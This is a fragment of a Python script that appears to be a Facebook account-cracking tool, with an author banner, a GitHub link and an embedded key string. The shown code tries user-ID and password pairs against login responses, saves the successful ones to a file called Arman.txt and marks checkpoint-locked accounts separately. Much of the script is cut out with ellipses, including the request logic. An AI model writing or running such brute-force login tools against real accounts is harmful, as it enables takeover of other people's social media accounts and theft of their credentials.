...
\033[1;91m                           
\033[1;97m--------------------------------------------------
\033[1;93m(!)\033[1;97m Author   : MR ARMAN
\033[1;93m(!)\033[1;97m Github   : https://github.com/Armanxtabi820/Cheak.git
\033[1;93m(!)\033[1;97m Fb Page  : Facebook Page not Found Error
\033[1;93m(!)\033[1;97m Api Key  : CFBID11N0V20SPIDATID11N
\033[1;97m--------------------------------------------------
"""
...
def choice_select():
	...
	print("[!]\033[1;95m Cracking Start...")
	time.sleep(0.05)
	print("[!]\033[1;95m Please Wait ThE Procces Has Been Started\033[1;0m")
	time.sleep(0.05)
	print(50*"-")
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;92m[Arman Ok] \033[1;96m"+uid+" | "+pass1+"\033[0;97m")
				ok = open("Arman.txt", "a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
				...
				if "www.facebook.com" in q["error"]:
					print("\033[1;91m[ARMAN_CP] "+uid+" | "+pass1+"\033[0;97m")
